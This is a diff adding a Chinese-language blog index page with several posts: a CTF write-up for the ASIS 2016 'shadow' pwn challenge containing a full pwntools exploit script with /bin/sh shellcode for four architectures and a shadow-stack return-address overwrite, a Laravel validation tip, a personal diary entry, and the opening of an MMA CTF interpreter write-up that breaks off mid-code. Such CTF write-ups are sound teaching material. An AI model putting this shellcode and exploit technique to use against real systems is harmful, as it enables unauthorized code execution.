@@ -274,6 +274,746 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/ASIS-CTF-Finals-2016-shadow-99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/ASIS-CTF-Finals-2016-shadow-99/" itemprop="url">[ASIS CTF Finals 2016] shadow 99</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T10:04:00+00:00">
+                2016-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+        
+          
+            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
+<p>Category: pwn<br>Point: 99<br>Solver: bruce30262 @ BambooFox<br>感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 angelboy 對 exploit 的指點 XD</p>
+</blockquote>
+<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, 除了 stack guard 有開以外其他保護全部沒開</p>
+<p>程式首先會用 <code>mmap</code> 配置一塊大小為 0x30000 的記憶體區塊，並將其當成 shadow stack 來使用，存放 return address。  </p>
+<p>main function 裡面會先要我們輸入名字 (buffer 位址在 .bss 段)，之後我們可以選擇新增一個 beer，或是讀取&#x2F;編輯一個 beer description。</p>
+<p>新增一個 beer 時，程式會先要求 beer description 的長度，之後會呼叫 malloc 配置一塊相對應大小的 buffer 給我們輸入 beer description 的內容。至於讀取&#x2F;編輯一個 beer description 則是會先要我們選擇要讀取&#x2F;編輯的 beer，之後會印出 beer 的 description，並詢問我們是否要編輯 beer 的 description。此時如果輸入一個 invalid 的選項 ( not y or n )，程式會直接進行遞迴呼叫，再 call 一次該 function 並做同樣的事情，直到我們輸入 y 或 n 為止。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>這題關鍵的地方在於  </p>
+<ul>
+<li>我們可以控制 malloc 的長度，以及 malloc 後 buffer 的內容</li>
+<li>我們可以對程式做遞迴呼叫</li>
+</ul>
+<p>glibc 的 malloc 在 size 很大的時候 (超過 0x20000)，會改用 mmap 來進行動態的記體配置。而 mmap 出來的 memory page，會接在上一次 mmap 出來的 memory page 的前面。因此，透過第一點，我們可以嘗試去新增一個長度很長的 beer description，這樣程式在呼叫 mmap 之後<strong>會將我們 beer description 的 buffer 接在 shadow stack 的前面。</strong>  </p>
+<p>之後我們可以嘗試對程式進行多次的遞迴呼叫，讓 shadow stack 不斷的 “往上長” (意即 shadow stack 的 top 位址會不斷得往前移)。只要 shadow stack 長到某一程度，就會跟我們 beer description 的 buffer 重疊在一起。此時我們再透過編輯 beer description 的功能，就可以改到 shadow stack 上的 return address，讓程式跳到我們想要的位址。這題因為只有 stack guard 的關係，可以執行 shellcode。 我們可以透過將 shellcode 塞入 name buffer，然後將 return address 改成 name buffer 位址的方式來跳 shellcode。</p>
+<figure class="highlight python"><figcaption><span>exp_shadow.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;shadow.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./shadow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_recvuntil</span>(<span class="params">s, delim</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>(<span class="params">arch=context.arch</span>):</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&quot;i386&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.i386.linux.sh(), null free, 22 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;amd64&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.amd64.linux.sh(), null free, 24 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;arm&quot;</span>:</span><br><span class="line">        <span class="comment"># null free, 27 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;aarch64&quot;</span>:</span><br><span class="line">        <span class="comment"># 4 null bytes, total 35 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_one</span>(<span class="params">size, desr</span>):</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;send desc length&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;length?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    log.info(<span class="string">&quot;send desc&quot;</span>)</span><br><span class="line">    r.send(desr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    shellcode_addr = <span class="number">0x0804a520</span></span><br><span class="line">    shellcode = sc()</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;send name (shellcode)&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;name?\n&quot;</span>, shellcode)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;it?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;add one beer&quot;</span>)</span><br><span class="line">    add_one(<span class="number">0x20000</span>, <span class="string">&quot;A&quot;</span>*(<span class="number">0x20000</span>-<span class="number">4</span>)+<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;beer uploaded to the memory!\n&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;0\n&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;add beer done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;choose desc&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>) <span class="comment"># choose desc</span></span><br><span class="line">    r.sendline(<span class="string">&quot;0&quot;</span>) <span class="comment"># input index</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;recieving BBBB&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recieving rest output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvline()</span><br><span class="line">    log.info(<span class="string">&quot;start stacking stack&quot;</span>)</span><br><span class="line"></span><br><span class="line">    maxx = <span class="number">80000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(maxx):</span><br><span class="line">        check = i% <span class="number">10000</span></span><br><span class="line">        <span class="keyword">if</span> check == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">        r.sendline(<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    r.send(p32(shellcode_addr)*(<span class="number">0x20000</span>/<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>不過因為主辦方網路不穩的關係，我自己跑 exploit local 端是可以 work，但是 remote 端會 timeout，因此最後是將 exploit 上傳到 trello 請隊友 Ann Tsai 幫忙跑。一開始跑的時候還是會在某個地方卡住，經過安博的指點之後修了一下 exploit，最後成功拿 shell 並得到 flag。  </p>
+<p>flag: <code>ASIS&#123;732f9beb138dbca4e44d5d184c3074dc&#125;</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/custom-responses-of-laravel-validations/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/custom-responses-of-laravel-validations/" itemprop="url">自定义 Laravel Validator 所返回的响应</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T13:08:08+00:00">
+                2016-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">技术</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+          <p>不得不说 Laravel 的 <a target="_blank" rel="noopener" href="http://laravel-china.org/docs/5.1/validation">Validation</a> 是极好的，非常易于使用，麻麻再也不用担心我要写一大堆验证啦 ~(　^ω^)</p>
+<p>但是这个 Validator 有一个神秘的地方 ( -д-)，正如官方文档所说，它会自动判断当前请求是否为 Ajax 发送的，如果是，则在验证失败的时候返回一个 <code>JsonResponse</code> 响应而不是 <code>RedirectResponse</code> 响应。</p>
+<blockquote>
+<p><strong>但是</strong>，这个 JSON 响应的状态码，是 422。</p>
+</blockquote>
+<p>WTF！坑爹呢这是！要知道 422 这个状态码是通不过 <code>jQuery.ajax.success</code> 的啊！</p>
+<p><img src="https://img.prin.studio/legacy/image.php?di=WYT3"></p>
+<p>在网上找了一圈，愣是没找着什么好一点的解决方法（全是叫你在 <code>$.ajax.failed</code> 里处理错误的）。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2016/custom-responses-of-laravel-validations/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/" itemprop="url">一见钟情，无疾而终</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T11:29:57+00:00">
+                2016-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">生活感悟</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+          昨天晚上，不知道为什么突然特别难过，或许是因为被同事说中心事，或许是因为想到我喜欢过的女孩而心存不甘，或许是因为憎恶现在这个状态的自己......总而言之，有那么一瞬间我感到我的心像是被挖去了一块，原来喜欢一个人可以让我如此难过，想到种种过往我以为自己会泣不成声，结果我声音哽咽着眼睛却是干的，或许我们最喜欢使用的那个“破涕为笑”的表情最能形容我当时的心境，我想了很久，一个人跑出去散步，当风轻轻地划过我的脸庞的时候，当秋天的寒意让我猝不及防的时候，我忽然觉得，当这个世界越发地充满“恶意”的时候，你更需要一个坚强地理由去生活，她们都教会我很多，和这个相比，悲伤和痛苦都显得微不足道，我想努力学好英语、我想努力练习写字、我想努力培养兴趣、我想努力克服恐惧，我是一个骄傲的人，在技术上是在生活上更应该是，如果我不能像编程一样掌控世界，我愿意在这纷繁的世界里不忘初心，喜欢和爱这种美好的情感，是不该让悲伤来消化的奢侈品;男人在年轻的时候，最难以接受而不得不接受的一个现实是，你非常喜欢一个人，可你此时此刻完全没有能力给她想要的生活，就像古古说她可能再遇不到我这样对她好的人，可她始终觉得我们两个人是没有未来的，而这一次，我忽然发现这一切是如此的相似，虽然我清楚地知道她们是完全不同的两个人，当她们同时对我说出“你会找到真正适合你的那个人”这句话的时候，我已无心分辨这句话的真假，我只知道我会陷入无休止的纠结，就像一个死循环导致的精神分裂;当一个男生接受女生“成为朋友”这种现实的时候，从某种意义上来讲，他是将对她的喜欢以一种新的方式重新输出，就像她不在公司里的时候，她愿意委托我帮她处理某些事情，这对我而言是非常开心的一个时刻，因为你永远都期待着，她在有事情的时候能够第一个想到你，即使她曾经拒绝过你两次，即使她明确告诉你她不喜欢你，我曾经告诉过自己，喜欢是占有而爱是克制，至少曾经有很多很多的瞬间，我们两个人因为坦露心声而变得非常开心，这是我最让我怀念的瞬间
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/MMA-CTF-2nd-2016-Interpreter-200/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/MMA-CTF-2nd-2016-Interpreter-200/" itemprop="url">[MMA CTF 2nd 2016] Interpreter 200</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-07T10:04:00+00:00">
+                2016-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+        
+          
+            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
+<p>Category: pwn<br>Point: 200<br>Solver: bruce30262 @ BambooFox</p>
+</blockquote>
+<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>首先透過 <code>file</code> 指令以及 <a target="_blank" rel="noopener" href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> 的幫助，我們可以知道這是一個 x86_64 的 ELF，保護全開:  </p>
+<pre>
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   ./befunge_patch  
+</pre>
+
+<p>之後透過將程式丟入 IDA Pro 做靜態分析，以及試著執行程式，對程式行為進行簡單的動態分析之後，我們可以得知:  </p>
+<ul>
+<li>這是一隻 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge">Befunge-93</a> 程式的 Interpreter。程式一開始會要求我們輸入一個 Befunge-93 程式，之後會試著解譯並執行我們的程式。  </li>
+<li>一隻 Befunge-93 程式由一連串的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list">Befunge-93 指令</a> 所組成。我們可以輸入很多行的 Befunge-93 指令(一行最多80個字元，最多25行)。  </li>
+<li>程式之後會一個字元一個字元的解譯並執行我們的Befunge-93 指令，最多執行到第 10000 個指令</li>
+</ul>
+<p>整理成 pseudo code 之後大概是這種感覺:  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不重要的部分將以註解代替</span></span><br><span class="line"><span class="comment">// 實際程式有做哪些事情可以自行利用 IDA Pro 進行分析</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to Online Befunge(93) Interpreter&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please input your program.&quot;</span>);</span><br><span class="line">	program = read_program(); <span class="comment">// read user input to buffer &#x27;program&#x27;</span></span><br><span class="line">	</span><br><span class="line">	step = <span class="number">10001</span>;</span><br><span class="line">	row = <span class="number">0</span>, col = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ins = program[<span class="number">80</span> * row + col]</span><br><span class="line">		<span class="keyword">switch</span> ( ins )</span><br><span class="line">		&#123;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>: <span class="comment">// ask user for a number and push it to stack</span></span><br><span class="line">				__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">				push(x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: <span class="comment">// Pop value and output as an integer followed by a space</span></span><br><span class="line">				x = pop();</span><br><span class="line">				__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%d &quot;</span>, x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:  <span class="comment">// pop x, y, push x*y</span></span><br><span class="line">				a = pop();</span><br><span class="line">				b = pop();</span><br><span class="line">				push(a * b);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span 